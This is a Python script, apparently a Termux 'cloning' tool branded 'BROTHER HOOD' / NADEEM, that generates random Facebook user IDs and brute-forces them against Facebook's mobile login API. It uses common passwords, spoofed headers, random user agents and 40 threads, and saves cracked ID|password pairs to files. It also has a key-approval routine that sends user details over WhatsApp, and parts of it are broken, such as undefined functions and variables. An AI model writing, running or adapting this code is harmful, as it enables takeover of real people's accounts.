#----------------------------[IMPORT/MODULE]-----------------------------------#
import requests,bs4,json,os,sys,uuid,random,datetime,time,re
import urllib3,rich,base64
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
import os,time,random,json,sys,datetime
try:
    import requests
except:
    os.system("pip3 install requests")
    import requests 
from concurrent.futures import ThreadPoolExecutor as ThreadPool
#-----------------------------[LINE]-----------------------------------#
def lin():
	print("\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━>BROTHER HOOD CLONING<━━━━━━━━━━━━━━━━━━━━━━━")
#----------------------------[DATE]-----------------------------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
date = str(tgl)+'-'+str(bln)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
#----------------------------[COLOR/CODE]-----------------------------------#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
#----------------------------[USER/AGENT]-----------------------------------#
def ua():
    rr=random.randint
    aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    zA=random.choice(['a','b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'])
    rx=random.randrange(1, 999)
    xx=f"Mozilla/5.0 (Wi    ndows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
    xx=f"Mozilla/5.0 (Linux; Android 12; X104-EEA) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6304.201 Mobile Safari/537.36"
    xx=f"Mozilla/5.0 (Linux; Android 14; MI PAD 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6315.215 Mobile Safari/537.36"
    return xx
#----------------------------[LOGO]-----------------------------------#
logo = (f"""        
   
\033[1;32m███╗   ██╗ █████╗ ██████╗ ███████╗███████╗███╗   ███╗     ██████╗ 
\033[1;31m████╗  ██║██╔══██╗██╔══██╗██╔════╝██╔════╝████╗ ████║    ██╔════╝ 
\033[1;37m██╔██╗ ██║███████║██║  ██║█████╗  █████╗  ██╔████╔██║    ██║  ███╗
\033[1;31m██║╚██╗██║██╔══██║██║  ██║██╔══╝  ██╔══╝  ██║╚██╔╝██║    ██║   ██║
\033[1;32m██║ ╚████║██║  ██║██████╔╝███████╗███████╗██║ ╚═╝ ██║    ╚██████╔╝
\033[1;37m╚═╝  ╚═══╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚══════╝╚═╝     ╚═╝     ╚═════╝ 
                                                                                                                         
\x1b[1;92m═━═━═━═━═━═━═══━═━☣ ─── 〣〘 LOVE MISS ALIYA 〙〣 ─── ☣═━═══━═━━━━━━━━═
 👑 \033[1;92m \0331;92m 👑\033[1;92m    OWNER     \033[1;91m\033[1;34m  \033[1;92    ☣─── 〣〘 Br͢oʞ͜͡ɘ͡ŋ N͢ʌ̽dɘ͜͡ɘ͢ɱ〙〣 ───☣       
 🌺 \033[1;92m\033 1;34m 🌺\033[1;92m  〘 Bʜ͢͡ᴀɪ͡ 〙     \033[1;91m\033[1;34m  \033[1;92m           〘 Əɽ͢͡ııç〙           
 🌺 \033[1;92m\033 1;34m 🌺\033[1;92m  〘 Bʜ͢͡ᴀɪ͡ 〙         \033[1;91m\033[1;34m  \033[1;92m       〘 Wʌ͢͡ʌs͜͡ʋ 〙     
 🌺 \033[1;92m\033 1;34m 🌺\033[1;92m  〘 Bʜ͢͡ᴀɪ͡ 〙         \033[1;91m\033[1;34m  \033[1;92       〘  Vı͜͡ʜʌ͢͡ʌƞ͡  〙
 🌺 \033[1;92m\033 1;34m 🌺\033[1;92m  〘 Bʜ͢͡ᴀɪ͡ 〙      ☣ ─── 〣〘 Lɵ͜͡ⱱɘ-Hʌ͢͡ɽɣʌ̊ƞ͜͡vı〙〣 ─── ☣
\x1b[1;92m═━═━═━═━═━━═━═━══━═━━═━━═━═━══━═━━══━═━━━══━═━═━══━═━━━━═━═━━━━═━━══━━═""")
#----------------------------[MAIN/DEF]--------------------------------------------------------------------------#
def main():
    user=[]
    os.system("clear")
    print(logo)
    print(f'\x1b[38;5;8m\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \033[1;37mEXAMPLE   : \033[1;37m10000 | 20000 | 90000 [-CHOOSE LIMIT ID-] 💔🙏 B-R HOOD')
    lin()
    limit=input("\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[1;97mMATHOD   : ")
    lin()
    os.system('clear')
    print(logo)
    print("\x1b[38;5;8m(\x1b[1;97m1\x1b[38;5;8m) \x1b[1;97mSELECT MATHOD ~ (2010 - 2009")
    lin()
    ask=input("\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[1;97mCHOICE    : ")
    lin()
    if ask in["1"]:
        star="10000"
        for i in range(int(limit)):
            data=str(random.choice(range(1000000000,1999999999)))
            user.append(data)
    else:
        star="10000"
        for i in range(int(limit)):
            data=str(random.choice(range(1000000000,1999999999)))
            user.append(data)    
    with ThreadPool(max_workers=40) as MrDevilEx:
        os.system('clear')
        print(logo)
        print(f'\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[38;5;47mTOTAL ID : {limit} \x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[38;5;47m METHOD ID YOUR CHOOSE BROKEN NADEEM 🌺 : \x1b[38;5;86m{ask}')
        print(f'\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[38;5;47mIF NO RESULT \x1b[38;5;8m[\x1b[38;5;47mON\x1b[1;97m/\x1b[38;5;47mOF\x1b[38;5;8m]  \x1b[38;5;47mAIRPLANE MODE W/C BROTHER-HOOD CAMAND ENJOY  ')
        lin()
        for mal in user:
            uid=star+mal
            MrDevilEx.submit(login,uid)    
loop=0
oks=[]
def login(uid):
    global oks,loop
    Session=requests.session()
    try:
        sys.stdout.write(f"\r\x1b[38;5;8m(\x1b[1;97m{date}\x1b[38;5;8m) \x1b[38;5;8m(\x1b[1;97m{loop}\x1b[38;5;8m) \x1b[38;5;8m(\x1b[1;97m{len(oks)}\x1b[38;5;8m)")
        sys.stdout.flush()
        for pw in ["57273200","123456789","1234567","12345678","123456","first@last"]:
            headers = {
            "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
            "x-fb-sim-hni": str(random.randint(20000, 40000)), 
            "x-fb-net-hni": str(random.randint(20000, 40000)), 
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "user-agent": ua(), 
            "content-type": "application/x-www-form-urlencoded", 
            "x-fb-http-engine": "Liger"}
            rp=Session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
            if "session_key" in rp:
                print(f"\r\r{G}|-NADEEM OKY-|  {A}➤ {G}{uid} {A}•{G} {pw}")
                open("/sdcard/NADEEM-OLD-OK","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:
                print(f"\r\r{G}|-NADEEM OK-|  {A}➤ {G}{uid} {A}•{G} {pw}")
                open("/sdcard/NADEEM-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            elif "Please Confirm Email" in str(rp):
                print(f"\r\r{G}|-NADEEM-OKY-| {A}➤ {G}{uid} {A}•{G} {pw}")
                open("/sdcard/NADEEM-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
    except:pass
main()
def Subscraption():
	key1=open('/data/data/com.termux/files/usr/bin/.mrBALOCH -cov', 'r').read()
	clear()
	print(logo)
	r1=requests.get("https://raw.githubusercontent.com/WASUx/F-1/main/APPROVAL.txt").text
	if key1 in r1:
		os.system('clear')
		print(logo)
		Main()
	else:
		os.system("clear")
		print(logo)
		print("\t \033[1;32m First Get Approvel\033[1;37m ")
		time.sleep(1)
		os.system("clear")
		print(logo)
		print ("")
		print(" \033[1;32m NADEEM Toll Free BUT You Need Get Approved First\033[1;37m\n")
		print(" \033[1;32m Note : YE TOOL FREE OF COST HAI BHAI \033[1;37m")
		print ("")
		print(" Your Key is Not Approved ")
		print("")
		print(" Copy And Send Key To Admin")
		print ("")
		print (" Your Key : "+ak+ah+key1 )
		print ("")
		name = input(" Your Name : ")
		print ("")
		gf = input(" Your gf Name : ")
		print ("")
		lol = input(" Your Your Email : ")
		print ("")
		input(" Press Enter To Send Key")
		time.sleep(3.5)
		tks = 'Dear%20NADEEM,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Email%20:%20'+lol+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+ah+key1
		os.system('am start https://wa.me/+919910632063?text=' + tks)
		Subscraption()        
Subscraption()
#----------------------------[CODE/END]-----------------------------------#
